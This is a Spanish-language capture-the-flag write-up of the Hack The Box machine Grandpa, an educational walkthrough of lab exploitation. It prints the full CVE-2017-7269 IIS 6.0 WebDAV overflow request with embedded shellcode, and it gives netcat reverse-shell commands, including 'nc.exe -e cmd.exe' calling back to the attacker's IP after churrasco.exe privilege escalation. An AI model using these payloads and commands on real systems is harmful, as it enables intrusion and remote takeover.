---
layout: single
title: HTB-Grandpa
excerpt: "WriteUp de la máquina HTB Grandpa -- Type: Easy"
date: 2022-03-30
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/writeups/grandpa/grandpa.png
categories:
  - WriteUps
tags:
  - HTB
  - Easy

---

<centre><img src="/assets/images/writeups/grandpa/grandpa.png"></centre>

[Maquina](https://app.hackthebox.com/machines/13) 



## Reconocimiento

```bash
sudo nmap -sCV --min-rate 5000 -Pn 10.10.10.14
```

```bash
Nmap scan report for 10.10.10.14
Host is up (0.045s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Wed, 30 Mar 2022 08:16:08 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos que tiene el puerto **80 (http)** abierto y la versión del servidor es **Microsoft IIS httpd 6.0** puede ser que sea vulnerable a **CVE-2017-7269**


## Explotación
Nos descargamos el exploit el cual no dará una reverse shell por la cual tendremos que tener un puerto a la escucha con netcat.

[CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

```bash
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```

```bash
nc -lvp 443
```


Le damos permisos de ejecución al exploit y lo ejecutamos con nuesta ip y por el puerto que vamos a tener a la escucha.

```bash
python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.14.9 443
```

```txt
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa￦ﾽﾨ￧ﾡﾣ￧ﾝﾡ￧ﾄﾳ￦ﾤﾶ￤ﾝﾲ￧ﾨﾹ￤ﾭﾷ￤ﾽﾰ￧ﾕﾓ￧ﾩﾏ￤ﾡﾨ￥ﾙﾣ￦ﾵﾔ￦ﾡﾅ￣ﾥﾓ￥ﾁﾬ￥ﾕﾧ￦ﾝﾣ￣ﾍﾤ￤ﾘﾰ￧ﾡﾅ￦ﾥﾒ￥ﾐﾱ￤ﾱﾘ￦ﾩﾑ￧ﾉﾁ￤ﾈﾱ￧ﾀﾵ￥ﾡﾐ￣ﾙﾤ￦ﾱﾇ￣ﾔﾹ￥ﾑﾪ￥ﾀﾴ￥ﾑﾃ￧ﾝﾒ￥ﾁﾡ￣ﾈﾲ￦ﾵﾋ￦ﾰﾴ￣ﾉﾇ￦ﾉﾁ￣ﾝﾍ￥ﾅﾡ￥ﾡﾢ￤ﾝﾳ￥ﾉﾐ￣ﾙﾰ￧ﾕﾄ￦ﾡﾪ￣ﾍﾴ￤ﾹﾊ￧ﾡﾫ￤ﾥﾶ￤ﾹﾳ￤ﾱﾪ￥ﾝﾺ￦ﾽﾱ￥ﾡﾊ￣ﾈﾰ￣ﾝﾮ￤ﾭﾉ￥ﾉﾍ￤ﾡﾣ￦ﾽﾌ￧ﾕﾖ￧ﾕﾵ￦ﾙﾯ￧ﾙﾨ￤ﾑﾍ￥ﾁﾰ￧ﾨﾶ￦ﾉﾋ￦ﾕﾗ￧ﾕﾐ￦ﾩﾲ￧ﾩﾫ￧ﾝﾢ￧ﾙﾘ￦ﾉﾈ￦ﾔﾱ￣ﾁﾔ￦ﾱﾹ￥ﾁﾊ￥ﾑﾢ￥ﾀﾳ￣ﾕﾷ￦ﾩﾷ￤ﾅﾄ￣ﾌﾴ￦ﾑﾶ￤ﾵﾆ￥ﾙﾔ￤ﾝﾬ￦ﾕﾃ￧ﾘﾲ￧ﾉﾸ￥ﾝﾩ￤ﾌﾸ￦ﾉﾲ￥ﾨﾰ￥ﾤﾸ￥ﾑﾈ￈ﾂ￈ﾂ￡ﾋﾀ￦ﾠﾃ￦ﾱﾄ￥ﾉﾖ￤ﾬﾷ￦ﾱﾭ￤ﾽﾘ￥ﾡﾚ￧ﾥﾐ￤ﾥﾪ￥ﾡﾏ￤ﾩﾒ￤ﾅﾐ￦ﾙﾍ￡ﾏﾀ￦ﾠﾃ￤ﾠﾴ￦ﾔﾱ￦ﾽﾃ￦ﾹﾦ￧ﾑﾁ￤ﾍﾬ￡ﾏﾀ￦ﾠﾃ￥ﾍﾃ￦ﾩﾁ￧ﾁﾒ￣ﾌﾰ￥ﾡﾦ￤ﾉﾌ￧ﾁﾋ￦ﾍﾆ￥ﾅﾳ￧ﾥﾁ￧ﾩﾐ￤ﾩﾬ> (Not <locktoken:write1>) <http://localhost/bbbbbbb￧ﾥﾈ￦ﾅﾵ￤ﾽﾃ￦ﾽﾧ￦ﾭﾯ￤ﾡﾅ￣ﾙﾆ￦ﾝﾵ￤ﾐﾳ￣ﾡﾱ￥ﾝﾥ￥ﾩﾢ￥ﾐﾵ￥ﾙﾡ￦ﾥﾒ￦ﾩﾓ￥ﾅﾗ￣ﾡﾎ￥ﾥﾈ￦ﾍﾕ￤ﾥﾱ￤ﾍﾤ￦ﾑﾲ￣ﾑﾨ￤ﾝﾘ￧ﾅﾹ￣ﾍﾫ￦ﾭﾕ￦ﾵﾈ￥ﾁﾏ￧ﾩﾆ￣ﾑﾱ￦ﾽﾔ￧ﾑﾃ￥ﾥﾖ￦ﾽﾯ￧ﾍﾁ￣ﾑﾗ￦ﾅﾨ￧ﾩﾲ￣ﾝﾅ￤ﾵﾉ￥ﾝﾎ￥ﾑﾈ￤ﾰﾸ￣ﾙﾺ￣ﾕﾲ￦ﾉﾦ￦ﾹﾃ￤ﾡﾭ￣ﾕﾈ￦ﾅﾷ￤ﾵﾚ￦ﾅﾴ￤ﾄﾳ￤ﾍﾥ￥ﾉﾲ￦ﾵﾩ￣ﾙﾱ￤ﾹﾤ￦ﾸﾹ￦ﾍﾓ￦ﾭﾤ￥ﾅﾆ￤ﾼﾰ￧ﾡﾯ￧ﾉﾓ￦ﾝﾐ￤ﾕﾓ￧ﾩﾣ￧ﾄﾹ￤ﾽﾓ￤ﾑﾖ￦ﾼﾶ￧ﾍﾹ￦ﾡﾷ￧ﾩﾖ￦ﾅﾊ￣ﾥﾅ￣ﾘﾹ￦ﾰﾹ￤ﾔﾱ￣ﾑﾲ￥ﾍﾥ￥ﾡﾊ￤ﾑﾎ￧ﾩﾄ￦ﾰﾵ￥ﾩﾖ￦ﾉﾁ￦ﾹﾲ￦ﾘﾱ￥ﾥﾙ￥ﾐﾳ￣ﾅﾂ￥ﾡﾥ￥ﾥﾁ￧ﾅﾐ￣ﾀﾶ￥ﾝﾷ￤ﾑﾗ￥ﾍﾡ￡ﾏﾀ￦ﾠﾃ￦ﾹﾏ￦ﾠﾀ￦ﾹﾏ￦ﾠﾀ￤ﾉﾇ￧ﾙﾪ￡ﾏﾀ￦ﾠﾃ￤ﾉﾗ￤ﾽﾴ￥ﾥﾇ￥ﾈﾴ￤ﾭﾦ￤ﾭﾂ￧ﾑﾤ￧ﾡﾯ￦ﾂﾂ￦ﾠﾁ￥ﾄﾵ￧ﾉﾺ￧ﾑﾺ￤ﾵﾇ￤ﾑﾙ￥ﾝﾗ￫ﾄﾓ￦ﾠﾀ￣ﾅﾶ￦ﾹﾯ￢ﾓﾣ￦ﾠﾁ￡ﾑﾠ￦ﾠﾃ￧﾿ﾾ￯﾿﾿￯﾿﾿￡ﾏﾀ￦ﾠﾃ￑ﾮ￦ﾠﾃ￧ﾅﾮ￧ﾑﾰ￡ﾐﾴ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁ￩ﾎﾑ￦ﾠﾀ￣ﾤﾱ￦ﾙﾮ￤ﾥﾕ￣ﾁﾒ￥ﾑﾫ￧ﾙﾫ￧ﾉﾊ￧ﾥﾡ￡ﾐﾜ￦ﾠﾃ￦ﾸﾅ￦ﾠﾀ￧ﾜﾲ￧ﾥﾨ￤ﾵﾩ￣ﾙﾬ￤ﾑﾨ￤ﾵﾰ￨ﾉﾆ￦ﾠﾀ￤ﾡﾷ￣ﾉﾓ￡ﾶﾪ￦ﾠﾂ￦ﾽﾪ￤ﾌﾵ￡ﾏﾸ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁVVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

Y por el netcat tendremos la ReverseShell.

```txt
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.14] 1031
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

El usuario que obtenemos es **nt authority\network service** y no de **system** y por lo tanto tendremos que elevar privilegios.

Podemos ejecutar el comando **systeminfo** en la máquina víctima para pasarlo por el [wes.py](https://github.com/bitsadmin/wesng/blob/master/wes.py) (python script para buscar exploits de windows)

```powershell
C:\Documents and Settings>systeminfo
```

```bash
python2 wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege"
```

Entre todas las vluns que encontramos podemos ver la **CVE-2008-1436** que utiliza el exploit [churrasco.exe](https://github.com/Re4son/Churrasco) para elevar privilegios.

```txt
Date: 20090414
CVE: CVE-2008-1436
KB: KB952004
Title: Vulnerabilities in Windows Could Allow Elevation of Privilege
Affected product: Microsoft Windows Server 2003 x64 Edition 
Affected component:
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/6705
````

Nos descargamos el [churrasco.exe](https://github.com/Re4son/Churrasco) y el [netcat.exe](https://github.com/int0x33/nc.exe) y los servimos con un servidor smb para poder pasarselos a la máquina windows.

```bash
wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe

impacket-smbserver share $(pwd) -smb2support
```

Los descargamos en la carpeta Temp:

```powershell
C:\WINDOWS\Temp>copy \\10.10.14.9\share\ch.exe
copy \\10.10.14.9\share\ch.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.9\share\nc.exe
copy \\10.10.14.9\share\nc.exe
        1 file(s) copied.

C:\WINDOWS\Temp>
```

Y nos podemos en escucha con netcat por un puerto diferente al usado.

```bash
nc -lvp 444
```

Y ya podemos ejecutar el comando para obtener una reverse shell con **churrasco.exe**

```powershell
ch.exe -d "nc.exe -e cmd.exe 10.10.14.9 444"
```

```powershell
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.14] 1037
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>
```

Flag **User Harry**:
```powershell
C:\Documents and Settings\Harry\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Documents and Settings\Harry\Desktop

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:32 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,320,251,392 bytes free
```

Flag **nt authority\system**:
```powershell
C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  05:28 PM    <DIR>          .
04/12/2017  05:28 PM    <DIR>          ..
04/12/2017  05:29 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,318,543,360 bytes free
```

